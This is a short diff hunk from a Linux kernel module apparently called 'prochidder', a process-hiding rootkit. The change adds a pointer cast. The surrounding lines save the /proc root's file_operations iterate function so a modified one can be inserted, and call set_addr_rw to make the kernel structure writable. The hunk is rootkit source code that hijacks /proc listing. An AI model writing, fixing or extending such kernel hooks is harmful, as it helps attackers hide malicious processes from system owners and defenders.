@@ -113,7 +113,7 @@ static int __init prochidder_init(void)
 {
     // insert our modified iterate for /proc
     procroot = procfile->parent;
-    proc_fops = procroot->proc_fops;
+    proc_fops = (struct file_operations*)procroot->proc_fops;
     orig_proc_iterate = proc_fops->iterate;
 
     set_addr_rw(proc_fops);
